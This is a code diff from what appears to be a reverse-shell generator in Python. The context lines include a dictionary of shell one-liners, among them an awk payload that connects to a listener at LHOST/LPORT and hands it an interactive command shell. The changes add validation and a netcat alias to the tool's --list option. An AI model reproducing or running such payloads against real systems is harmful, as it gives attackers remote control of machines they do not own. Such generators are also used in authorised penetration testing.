@@ -170,9 +170,15 @@ shells = {
     'awk':{
         '1':''' awk 'BEGIN {s = "/inet/tcp/0/LHOST/LPORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null '''
     }
-}
+}   
 # List given shell type if --list flag supplied
 if args.list:
+    if args.list.lower() == 'netcat':
+        args.list = 'nc' 
+    if args.list.upper() not in available_shells:
+        print(f"[-] {args.list} is not an available shell")
+        exit(0)
+    print(f"- {args.list.upper()} options -\n")
     for i in shells[args.list]:
         print(f'==> {i}')
         print(shells[args.list][i]+"\n")
@@ -212,6 +218,7 @@ shell = args.shell.lower()
 # Makes netcat nc so user don't have to remember if it was nc or netcat
 if "netcat" in shell:
     shell = shell.replace("netcat","nc")
+
 subgroup = None
 
 # Split shell type and name
